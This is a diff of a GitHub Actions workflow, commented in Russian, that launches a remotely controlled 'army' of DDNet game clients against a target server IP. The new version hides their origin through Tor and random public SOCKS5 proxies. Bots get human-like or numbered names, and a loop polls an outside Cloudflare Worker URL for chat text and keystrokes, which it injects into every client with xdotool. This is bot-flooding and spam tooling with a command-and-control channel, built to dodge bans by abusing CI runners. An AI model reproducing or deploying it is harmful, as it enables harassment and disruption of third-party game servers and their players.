@@ -1,4 +1,4 @@
-name: DDNet Bot Army RESIDENTIAL
+name: DDNet TOR-SOCKS UDP Army
 
 on: 
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
       server_ip:
         description: 'IP:PORT сервера DDNet'
         required: true
-        default: '5.189.17.23:2126'
+        default: '46.174.48.103:51011'
 
 jobs:
   spawn-bots:
@@ -21,121 +21,100 @@ jobs:
       - name: Install Dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y xvfb xdotool jq libsdl2-2.0-0 libcurl4 libfreetype6 libgl1 libglx-mesa0 libglu1-mesa libnotify4 libpng16-16 libvorbisfile3 libgl1-mesa-dri openvpn
-      
-      - name: Connect to Residential VPN (with Auto-Retry)
+          sudo apt-get install -y xvfb xdotool jq libsdl2-2.0-0 libcurl4 libfreetype6 libgl1-mesa-dri proxychains4 tor
+
+      - name: Setup TOR & Proxychains
         run: |
-          OLD_IP=$(curl -s --max-time 5 https://ifconfig.me || echo "unknown")
-          echo "Стартовый IP (GitHub): $OLD_IP"
-          echo -e "vpn\nvpn" > pass.txt
+          # Запускаем TOR (он нужен для анонимного скачивания списков)
+          sudo systemctl start tor
+          
+          # Настраиваем proxychains на использование SOCKS5
+          # Мы будем динамически подставлять рабочий прокси в конфиг
+          echo "strict_chain" > proxychains.conf
+          echo "proxy_dns" >> proxychains.conf
+          echo "remote_dns_res" >> proxychains.conf
+          echo "tcp_read_time_out 15000" >> proxychains.conf
+          echo "tcp_connect_time_out 8000" >> proxychains.conf
+          echo "[ProxyList]" >> proxychains.conf
 
-          # Качаем список серверов
-          curl -s https://www.vpngate.net/api/iphone/ > vpn_list.csv
-
-          # Флаг успеха
-          VPN_SUCCESS=false
-
-          # Пробуем до 5 разных серверов, если первый не заведется
-          for attempt in {1..5}; do
-            echo "--- Попытка подключения №$attempt ---"
+      - name: Find Working UDP Proxy
+        run: |
+          echo "Скачиваем список SOCKS5 через TOR..."
+          # Качаем список прокси через TOR, чтобы гитхаб не забанили
+          curl --socks5-hostname 127.0.0.1:9050 -L "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&simplified=true" -o socks5_list.txt
+          
+          # Берем случайный прокси для этой машины
+          # В SOCKS5 UDP работает через команду UDP ASSOCIATE
+          for i in {1..20}; do
+            PROXY=$(shuf -n 1 socks5_list.txt)
+            IP=$(echo $PROXY | cut -d':' -f1)
+            PORT=$(echo $PROXY | cut -d':' -f2)
             
-            # Выбираем случайную строку с конфигом
-            RAW_CONFIG=$(grep -vE "^#|^\*" vpn_list.csv | awk -F',' '{print $15}' | grep -v "^$" | shuf -n 1 | tr -d '\r')
-            echo "$RAW_CONFIG" | base64 --decode --ignore-garbage > client.ovpn
+            echo "socks5 $IP $PORT" >> proxychains.conf
+            echo "Проверка прокси $IP:$PORT..."
             
-            # Чистим конфиг от возможных дублей dev tun и добавляем наши опции
-            sed -i '/dev tun/d' client.ovpn
-            sed -i '/auth-user-pass/d' client.ovpn
-            echo "dev tun" >> client.ovpn
-            echo "auth-user-pass pass.txt" >> client.ovpn
-            echo "redirect-gateway def1" >> client.ovpn
-            echo "auth-nocache" >> client.ovpn
-            echo "verb 3" >> client.ovpn
-
-            # Убиваем старый процесс если он есть
-            sudo pkill openvpn || true
-            sleep 2
-
-            # Запускаем OpenVPN
-            sudo openvpn --config client.ovpn --daemon --log vpn.log
-
-            # Ждем 25 секунд на этой попытке
-            for i in {1..10}; do
-              sleep 2.5
-              if ip addr show tun0 > /dev/null 2>&1; then
-                NEW_IP=$(curl -s --max-time 5 https://ifconfig.me || echo "waiting")
-                if [[ "$NEW_IP" != "$OLD_IP" && "$NEW_IP" != "waiting" ]]; then
-                  echo "✅ VPN ПОДКЛЮЧЕН! Новый IP: $NEW_IP"
-                  VPN_SUCCESS=true
-                  break 2
-                fi
-              fi
-              echo "Ожидание туннеля..."
-            done
-            
-            echo "❌ Сервер не ответил, пробуем другой..."
-            cat vpn.log | tail -n 10
+            # Быстрая проверка связи (TCP)
+            if timeout 5s nc -z $IP $PORT; then
+              echo "✅ Прокси выбран: $IP:$PORT"
+              break
+            else
+              # Если не подошел, удаляем последнюю строку и пробуем другой
+              sed -i '$d' proxychains.conf
+            fi
           done
-
-          if [ "$VPN_SUCCESS" = false ]; then
-            echo "❌ Не удалось найти рабочий VPN сервер после 5 попыток."
-            exit 1
-          fi
 
       - name: Download DDNet Client
         run: |
-          LINK=$(curl -s https://ddnet.org/downloads/ | grep -o 'href="[^"]*linux_x86_64\.tar\.xz"' | head -n 1 | cut -d'"' -f2)
-          curl -L -o ddnet.tar.xz "https://ddnet.org/downloads/$LINK"
-          tar -xf ddnet.tar.xz
+          wget -q https://ddnet.org/downloads/DDNet-18.1-linux_x86_64.tar.xz
+          tar -xf DDNet-18.1-linux_x86_64.tar.xz
           mv DDNet-* ddnet_folder
 
-      - name: Spawn & Control Army
+      - name: Spawn Official Bots
         env:
           CONTROL_URL: "https://lively-king-450c.5yearsme5.workers.dev/"
           SERVER_ADDR: "${{ github.event.inputs.server_ip }}"
         run: |
           cd ddnet_folder
           export DISPLAY=:99
-          Xvfb :99 -screen 0 1024x768x24 +extension GLX +render -noreset &
+          Xvfb :99 -screen 0 640x480x24 +extension GLX +render -noreset &
           sleep 3
-          export LIBGL_ALWAYS_SOFTWARE=1
+          
+          # Настройка бота
+          NAME="Bot_${{ matrix.instance }}_$((RANDOM % 999))"
+          echo "player_name \"$NAME\"" > bot.cfg
+          echo "snd_enable 0" >> bot.cfg
+          echo "cl_shownames 0" >> bot.cfg
 
-          NAMES=("Sonic" "Pavel" "Sanya" "Maks" "Dimon" "Killer" "Legend" "TeePlayer" "Panda" "Apple")
-
-          for i in {1..4}; do
-            RAND_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}
-            HUMAN_NAME="${RAND_NAME}_$((RANDOM % 999))"
-            cat << EOF > "bot$i.cfg"
-          cl_show_welcome 0
-          cl_motd_time 0
-          cl_auto_join_team 1
-          player_name "$HUMAN_NAME"
-          connect "$SERVER_ADDR"
-          EOF
-            ./DDNet -f "bot$i.cfg" > bot_$i.log 2>&1 &
-            sleep 10
-          done
-
+          # ЗАПУСК через Proxychains (UDP трафик пойдет через SOCKS5)
+          # Мы запускаем 4 бота (основа + 3 dummy) на один прокси
+          proxychains4 -f ../proxychains.conf ./DDNet -f bot.cfg "connect $SERVER_ADDR; cl_dummy_name ${NAME}_d1; +dummy_connect; cl_dummy_name ${NAME}_d2; +dummy_connect" > bot.log 2>&1 &
+          
+          echo "Бот запущен через прокси. Ожидание команд из Worker..."
+          
+          # Цикл управления (как в твоем скрипте)
           LAST_ID="0"
           while true; do
-            # Вывод статуса для отладки
-            tail -n 1 bot_1.log || true
-            
             CMD_JSON=$(curl -s --max-time 3 "$CONTROL_URL" || echo '{"id":"0"}')
             ID=$(echo "$CMD_JSON" | jq -r '.id // 0')
             
             if [ "$ID" != "$LAST_ID" ] && [ "$ID" != "0" ]; then
               LAST_ID=$ID
-              TYPE=$(echo "$CMD_JSON" | jq -r '.type')
               VAL=$(echo "$CMD_JSON" | jq -r '.value')
+              TYPE=$(echo "$CMD_JSON" | jq -r '.type')
+              
               WIDS=$(xdotool search --class "DDNet")
               for WID in $WIDS; do
                 if [ "$TYPE" == "chat" ]; then
                   xdotool key --window $WID t && sleep 0.2 && xdotool type --window $WID "$VAL" && sleep 0.2 && xdotool key --window $WID Return
-                elif [ "$TYPE" == "key" ]; then
+                else
                   xdotool key --window $WID "$VAL"
                 fi
               done
             fi
             sleep 4
+            # Если бот вылетел - перезапускаем (опционально)
+            if ! pgrep -x "DDNet" > /dev/null; then
+               echo "Бот упал, перезапуск..."
+               proxychains4 -f ../proxychains.conf ./DDNet -f bot.cfg "connect $SERVER_ADDR; +dummy_connect" &
+            fi
           done
